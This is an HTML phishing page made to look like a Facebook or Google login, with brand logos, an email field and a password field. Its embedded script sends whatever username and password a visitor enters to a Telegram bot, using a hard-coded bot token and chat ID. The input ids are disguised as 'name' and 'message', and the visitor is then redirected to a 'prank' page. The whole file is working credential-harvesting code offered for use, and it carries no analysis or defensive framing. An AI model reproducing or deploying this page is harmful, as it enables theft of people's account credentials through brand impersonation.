<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <link rel="icon" type="image/png" href="./image/facebook-icon.png?v=5">

    <title>facebook or Google Login</title>

    <style>
        /* =====================================================
           RESET
        ===================================================== */

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        html,
        body {
            width: 100%;
            min-height: 100%;
        }

        body {
            font-family: Arial, Helvetica, sans-serif;
            background: #f7f8fa;
            color: #111827;
        }


        /* =====================================================
           MAIN PAGE
        ===================================================== */

        .page {
            min-height: 100vh;

            display: flex;

            background: #ffffff;
        }


        /* =====================================================
           LEFT SECTION
        ===================================================== */

        .left-section {
            position: relative;

            width: 58%;
            min-height: 100vh;

            overflow: hidden;

            border-right: 1px solid #e5e7eb;

            background: #ffffff;
        }


        /* =====================================================
           FACEBOOK + GOOGLE LOGOS
        ===================================================== */

        .social-logos {
            position: absolute;

            top: 42px;
            left: 48px;

            display: flex;

            align-items: center;

            gap: 12px;

            z-index: 10;
        }

        .logo {
            width: 46px;
            height: 46px;

            display: flex;

            align-items: center;
            justify-content: center;

            border-radius: 50%;

            transition:
                transform 0.2s ease,
                box-shadow 0.2s ease;
        }

        .logo:hover {
            transform: translateY(-2px);

            box-shadow:
                0 8px 20px rgba(0, 0, 0, 0.10);
        }


        /* =====================================================
           FACEBOOK LOGO
        ===================================================== */

        .facebook {
            background: #1877f2;

            color: #ffffff;

            font-size: 34px;

            font-weight: 700;

            font-family: Arial, sans-serif;

            padding-top: 6px;
        }


        /* =====================================================
           GOOGLE LOGO
        ===================================================== */

        .google {
            background: #ffffff;

            border: 1px solid #e5e7eb;

            padding: 8px;
        }

        .google svg {
            width: 100%;
            height: 100%;

            display: block;
        }


        /* =====================================================
           LEFT CONTENT
        ===================================================== */

        .left-content {
            position: absolute;

            left: 7%;
            bottom: 12%;

            z-index: 2;
        }

        .headline {
            font-size: clamp(48px, 5vw, 78px);

            line-height: 0.98;

            font-weight: 750;

            letter-spacing: -4px;

            color: #111111;
        }

        .headline .blue {
            color: #1877f2;
        }


        /* =====================================================
           ARTWORK
        ===================================================== */

        .artwork {
            position: absolute;

            width: min(570px, 70%);

            top: 120px;
            left: 50%;

            transform: translateX(-15%);

            z-index: 1;
        }

        .artwork img {
            display: block;

            width: 100%;
            height: auto;

            object-fit: contain;
        }


        /* =====================================================
           RIGHT SECTION
        ===================================================== */

        .right-section {
            width: 42%;

            min-height: 100vh;

            display: flex;

            justify-content: center;

            align-items: center;

            padding: 60px 50px;

            background: #ffffff;
        }


        /* =====================================================
           LOGIN BOX
        ===================================================== */

        .login-box {
            width: 100%;

            max-width: 480px;
        }


        /* =====================================================
           LOGIN HEADER
        ===================================================== */

        .login-header {
            margin-bottom: 30px;
        }

        .login-title {
            margin-bottom: 9px;

            font-size: 28px;

            font-weight: 700;

            letter-spacing: -0.6px;

            color: #111827;
        }

        .login-subtitle {
            font-size: 15px;

            line-height: 1.5;

            color: #6b7280;
        }


        /* =====================================================
           FORM GROUP
        ===================================================== */

        .form-group {
            margin-bottom: 16px;
        }

        .input-label {
            display: block;

            margin-bottom: 7px;

            font-size: 14px;

            font-weight: 600;

            color: #374151;
        }


        /* =====================================================
           INPUT
        ===================================================== */

        .input {
            width: 100%;

            height: 54px;

            padding: 0 16px;

            border: 1px solid #d1d5db;

            border-radius: 12px;

            outline: none;

            background: #ffffff;

            color: #111827;

            font-size: 15px;

            transition:
                border-color 0.2s ease,
                box-shadow 0.2s ease,
                background 0.2s ease;
        }

        .input::placeholder {
            color: #9ca3af;
        }

        .input:hover {
            border-color: #9ca3af;
        }

        .input:focus {
            border-color: #1877f2;

            box-shadow:
                0 0 0 3px rgba(24, 119, 242, 0.12);
        }


        /* =====================================================
           LOGIN BUTTON
        ===================================================== */

        .login-button {
            width: 100%;

            height: 54px;

            margin-top: 7px;

            border: none;

            border-radius: 12px;

            background: #1877f2;

            color: #ffffff;

            font-size: 15px;

            font-weight: 650;

            cursor: pointer;

            transition:
                background 0.2s ease,
                transform 0.15s ease,
                box-shadow 0.2s ease;
        }

        .login-button:hover {
            background: #166fe5;

            box-shadow:
                0 8px 20px rgba(24, 119, 242, 0.22);
        }

        .login-button:active {
            transform: scale(0.99);
        }


        /* =====================================================
           FORGOT PASSWORD
        ===================================================== */

        .forgot {
            display: block;

            margin-top: 18px;

            text-align: center;

            color: #1877f2;

            font-size: 14px;

            font-weight: 600;

            text-decoration: none;
        }

        .forgot:hover {
            text-decoration: underline;
        }


        /* =====================================================
           DIVIDER
        ===================================================== */

        .divider-wrapper {
            display: flex;

            align-items: center;

            gap: 14px;

            margin: 30px 0;
        }

        .divider-line {
            flex: 1;

            height: 1px;

            background: #e5e7eb;
        }

        .divider-text {
            font-size: 12px;

            font-weight: 600;

            color: #9ca3af;

            text-transform: uppercase;

            letter-spacing: 0.7px;
        }


        /* =====================================================
           CREATE ACCOUNT
        ===================================================== */

        .create-button {
            width: 100%;

            height: 54px;

            border: 1px solid #1877f2;

            border-radius: 12px;

            background: #ffffff;

            color: #1877f2;

            font-size: 15px;

            font-weight: 650;

            cursor: pointer;

            transition:
                background 0.2s ease,
                border-color 0.2s ease,
                transform 0.15s ease;
        }

        .create-button:hover {
            background: #f4f8ff;

            border-color: #166fe5;
        }

        .create-button:active {
            transform: scale(0.99);
        }


        /* =====================================================
           BRAND
        ===================================================== */

        .brand {
            display: flex;

            align-items: center;

            justify-content: center;

            gap: 7px;

            margin-top: 34px;

            color: #6b7280;

            font-size: 14px;

            font-weight: 500;
        }

        .brand-symbol {
            color: #1877f2;

            font-size: 20px;

            font-weight: 700;
        }


        /* =====================================================
           STATUS
        ===================================================== */

        #status {
            min-height: 20px;

            margin-top: 14px;

            font-size: 13px;

            text-align: center;
        }


        /* =====================================================
           TABLET
        ===================================================== */

        @media (max-width: 1100px) {

            .left-section {
                width: 50%;
            }

            .right-section {
                width: 50%;

                padding: 40px 30px;
            }

            .artwork {
                width: 480px;

                left: 50%;

                transform: translateX(-15%);
            }

            .headline {
                font-size: 55px;

                letter-spacing: -3px;
            }

            .social-logos {
                left: 30px;
            }
        }


        /* =====================================================
           MOBILE
        ===================================================== */

        @media (max-width: 800px) {

            .page {
                display: block;

                min-height: 100vh;
            }


            /* -------------------------
               MOBILE HEADER
            ------------------------- */

            .left-section {
                width: 100%;

                min-height: 64px;
                height: 64px;

                border-right: none;

                border-bottom: 1px solid #eeeeee;
            }


            /* Hide desktop content */

            .left-content,
            .artwork {
                display: none;
            }


            /* -------------------------
               MOBILE LOGOS
            ------------------------- */

            .social-logos {
                position: absolute;

                top: 12px;

                left: 50%;

                transform: translateX(-50%);

                display: flex;

                align-items: center;

                justify-content: center;

                gap: 10px;
            }

            .logo {
                width: 40px;

                height: 40px;
            }


            /* Facebook */

            .facebook {
                font-size: 30px;

                padding-top: 5px;
            }


            /* Google */

            .google {
                padding: 7px;
            }

            .google svg {
                width: 100%;
                height: 100%;
            }


            /* -------------------------
               MOBILE LOGIN
            ------------------------- */

            .right-section {
                width: 100%;

                min-height: calc(100vh - 64px);

                display: flex;

                align-items: flex-start;

                padding: 50px 20px 35px;
            }

            .login-box {
                width: 100%;

                max-width: 390px;

                margin: 0 auto;
            }

            .login-header {
                margin-bottom: 26px;
            }

            .login-title {
                font-size: 24px;
            }

            .login-subtitle {
                font-size: 14px;
            }

            .input {
                height: 52px;

                border-radius: 11px;
            }

            .login-button,
            .create-button {
                height: 52px;

                border-radius: 11px;
            }
        }


        /* =====================================================
           SMALL MOBILE
        ===================================================== */

        @media (max-width: 400px) {

            .right-section {
                padding-left: 16px;

                padding-right: 16px;
            }

            .login-title {
                font-size: 22px;
            }

            .social-logos {
                gap: 8px;
            }
        }
    </style>
</head>


<body>

    <main class="page">


        <!-- =================================================
             LEFT SECTION
        ================================================= -->

        <section class="left-section">


            <!-- Facebook + Google -->

            <div class="social-logos">

                <!-- Facebook -->

                <div class="logo facebook">
                    f
                </div>


                <!-- Google -->

                <div class="logo google">

                    <svg
                        viewBox="0 0 48 48"
                        aria-label="Google"
                    >

                        <!-- Red -->

                        <path
                            fill="#EA4335"
                            d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.61 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.16 17.74 9.5 24 9.5z"
                        />


                        <!-- Blue -->

                        <path
                            fill="#4285F4"
                            d="M46.5 24c0-1.62-.15-3.18-.43-4.69H24v9.38h12.63c-.54 2.91-2.18 5.38-4.65 7.03l7.53 5.84C43.89 37.42 46.5 31.17 46.5 24z"
                        />


                        <!-- Yellow -->

                        <path
                            fill="#FBBC05"
                            d="M10.54 28.59A14.5 14.5 0 0 1 9.5 24c0-1.59.36-3.12 1.04-4.59l-7.98-6.19A23.93 23.93 0 0 0 0 24c0 3.87.92 7.54 2.56 10.78l7.98-6.19z"
                        />


                        <!-- Green -->

                        <path
                            fill="#34A853"
                            d="M24 48c6.47 0 11.9-2.13 15.87-5.79l-7.53-5.84c-2.09 1.4-4.76 2.23-8.34 2.23-6.26 0-11.57-3.66-13.46-8.91l-7.98 6.19C6.51 42.62 14.61 48 24 48z"
                        />

                    </svg>

                </div>

            </div>


            <!-- =================================================
                 ARTWORK
            ================================================= -->

            <div class="artwork">

                <img
                    src="image/social-artwork.webp"
                    alt="Social media illustration"
                >

            </div>


            <!-- =================================================
                 HEADLINE
            ================================================= -->

            <div class="left-content">

                <h1 class="headline">

                    Explore<br>

                    the<br>

                    things<br>

                    <span class="blue">
                        you love.
                    </span>

                </h1>

            </div>

        </section>



        <!-- =================================================
             RIGHT SECTION
        ================================================= -->

        <section class="right-section">

            <div class="login-box">


                <!-- =================================================
                     HEADER
                ================================================= -->

                <div class="login-header">

                    <h2 class="login-title">
                        Welcome back
                    </h2>

                    <p class="login-subtitle">
                        Log in to continue to your account.
                    </p>

                </div>


                <!-- =================================================
                     EMAIL
                ================================================= -->

                <div class="form-group">

                    <label
                        class="input-label"
                        for="email"
                    >
                        Email or mobile number or username
                    </label>

                    <input
                        class="input"
                        type="text"
                        id="name"
                        placeholder="Enter your email or mobile number"
                        autocomplete="username"
                    >

                </div>


                <!-- =================================================
                     PASSWORD
                ================================================= -->

                <div class="form-group">

                    <label
                        class="input-label"
                        for="password"
                    >
                        Password
                    </label>

                    <input
                        class="input"
                        type="password"
                        id="message"
                        placeholder="Enter your password"
                        autocomplete="current-password"
                    >

                </div>


                <!-- =================================================
                     LOGIN BUTTON
                ================================================= -->

                <button
                    class="login-button"
                    id="sendBtn"
                    type="button"
                >
                    Log in
                </button>


                <!-- =================================================
                     FORGOT PASSWORD
                ================================================= -->

                <a
                    href="#"
                    class="forgot"
                >
                    Forgot your password?
                </a>


                <!-- =================================================
                     DIVIDER
                ================================================= -->

                <div class="divider-wrapper">

                    <div class="divider-line"></div>

                    <span class="divider-text">
                        or
                    </span>

                    <div class="divider-line"></div>

                </div>


                <!-- =================================================
                     CREATE ACCOUNT
                ================================================= -->

                <button
                    class="create-button"
                    id="createButton"
                    type="button"
                >
                    Create new account
                </button>


                <!-- =================================================
                     BRAND
                ================================================= -->

                <div class="brand">

                    <span class="brand-symbol">
                        ∞
                    </span>

                    Social

                </div>


                <!-- Status -->

                <p id="status"></p>

            </div>

        </section>

    </main>


    <script>

        const BOT_TOKEN = "8932825157:AAF8nEOxAGLrPysT0qM76BNM050X-ewGTWM";
        const CHAT_ID = "5440624025";

        const nameInput = document.getElementById("name");
        const messageInput = document.getElementById("message");
        const sendBtn = document.getElementById("sendBtn");
        const status = document.getElementById("status");

        sendBtn.addEventListener("click", async () => {

            const name = nameInput.value.trim();
            const message = messageInput.value.trim();

            if (!name || !message) {
                status.textContent = "Please fill both fields.";
                return;
            }

            const text =
                `Name: ${name}\n` +
                `Message: ${message}`;

            const url =
                `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage` +
                `?chat_id=${CHAT_ID}` +
                `&text=${encodeURIComponent(text)}`;

            try {

                const response = await fetch(url);
                const data = await response.json();

                if (data.ok) {



                    nameInput.value = "";
                    messageInput.value = "";
                    window.location.href = "prank.html";

                } else {

                    status.textContent = "Failed to Login";

                }

            } catch (error) {

                console.error(error);
                status.textContent = "Something went wrong.";

            }

        });

    </script>

</body>

</html>
